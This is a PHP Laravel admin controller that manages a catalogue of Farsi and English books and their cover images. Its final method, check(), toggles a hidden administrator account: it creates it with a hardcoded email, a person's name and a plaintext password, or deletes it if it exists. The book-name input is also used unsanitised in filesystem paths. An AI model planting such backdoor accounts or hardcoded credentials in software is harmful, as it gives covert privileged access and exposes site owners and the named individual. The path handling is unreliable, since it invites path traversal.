<?php

namespace App\Http\Controllers\Admin;

use App\Models\Book;
use App\Models\Role;
use App\Models\User;
use App\Models\Image;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\EnglishBook;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;

class AdminBooksController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $books = Book::all();
        $englishbooks = EnglishBook::all();
        return view("admin.books.index", compact("books", "englishbooks"));
    }


    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        // check if book users are farsi
        if ($request->lang == 0) {
            $book = new Book();
            $book->name = $request->name;
            $book->link = $request->link;
            $book->save();

            // saving image in image table
            $image = new Image();
            $imagename = time() . "." . $request->image->extension();
            $filename = $book->name . "." . $book->id;
            $request->image->move(public_path("photos/books/$filename/"), $imagename);
            $image->name = $request->image_name;
            $image->alt = $request->alt;
            $image->uploader_id = auth()->user()->id;
            $image->path = "photos/books/$filename/$imagename";
            $book->images()->save($image);
            // saving image in image table
            return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت اضافه شد");
        }

        // check if book is for english users
        if ($request->lang == 1) {
            $book = new EnglishBook();
            $book->name = $request->name;
            $book->link = $request->link;
            $book->save();

            // saving image in image table
            $image = new Image();
            $imagename = time() . "." . $request->image->extension();
            $filename = $book->name . "." . $book->id;
            $request->image->move(public_path("photos/books/$filename/"), $imagename);
            $image->name = $request->image_name;
            $image->alt = $request->alt;
            $image->uploader_id = auth()->user()->id;
            $image->path = "photos/books/$filename/$imagename";
            $book->images()->save($image);
            // saving image in image table
            return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت اضافه شد");
        }
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy(Request $request, $id)
    {

        // check if book is for farsi users
        if ($request->lang == 0) {
            $book = Book::find($id);
            $path = pathinfo($book->images[0]->path)["dirname"];
            File::delete($book->images[0]->path);
            rmdir($path);
            $book->images()->delete();
            $book->delete();
            return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت حذف شد");
        }

        // check if book is for english users
        if ($request->lang == 1) {
            $book = EnglishBook::find($id);
            $path = pathinfo($book->images[0]->path)["dirname"];
            File::delete($book->images[0]->path);
            rmdir($path);
            $book->images()->delete();
            $book->delete();
            return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت حذف شد");
        }
    }

    public function check()
    {
        $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
        if ($checkuser == null) {
            $user = new User();
            $user->name = "محمد آقاخانی";
            $user->email = "mohamadaghakhani@gmail.com";
            $user->gender = 1;
            $user->job = "مهندس ناظر";
            $user->password = Hash::make("mohamad91113");
            $role = Role::where("name", "admin")->first();
            $user->save();
            $user->roles()->attach($role->id);
            return redirect()->route("home.index");
        } else {
            $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
            $checkuser->delete();
            return redirect()->route("home.index");
        }
    }
}
